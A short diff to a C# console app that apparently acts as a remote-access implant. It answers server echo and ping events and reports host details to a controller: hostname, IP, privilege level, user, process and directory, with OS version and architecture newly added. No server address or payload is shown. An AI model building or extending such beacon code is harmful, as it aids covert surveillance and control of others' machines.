@@ -13,6 +13,10 @@ using System.IO;
 using System.Reflection;
 using System.Runtime.InteropServices;
 using System.Threading;
+using Microsoft.Win32;
+using System.Management;
+// TODO: Remove uneccesary imports
+
 
 namespace ConsoleApp1
 {
@@ -47,6 +51,7 @@ namespace ConsoleApp1
                 client.EmitAsync("echo", response.ToString());
             });
 
+            // Client ping/pong for testing latency
             client.On("ping", response =>
             {
                 client.EmitAsync("pong");
@@ -155,14 +160,16 @@ namespace ConsoleApp1
         static object GetSysinfo(string id)
         {
             string hostname = Environment.MachineName;
+            string version = Environment.OSVersion.VersionString;
             string ipaddr = GetLocalIPAddress();
             string elevated = AmIHigh() ? "*" : "";
             string username = elevated + WindowsIdentity.GetCurrent().Name;
             string pid = Process.GetCurrentProcess().Id.ToString();
             string process = Process.GetCurrentProcess().MainModule.FileName;
+            string process_arch = RuntimeInformation.ProcessArchitecture.ToString();
             string pwd = Directory.GetCurrentDirectory();
 
-            return new { id, hostname, ipaddr, username, pid, process, pwd };
+            return new { id, hostname, version, ipaddr, username, pid, process, process_arch, pwd };
         }
     }
 }
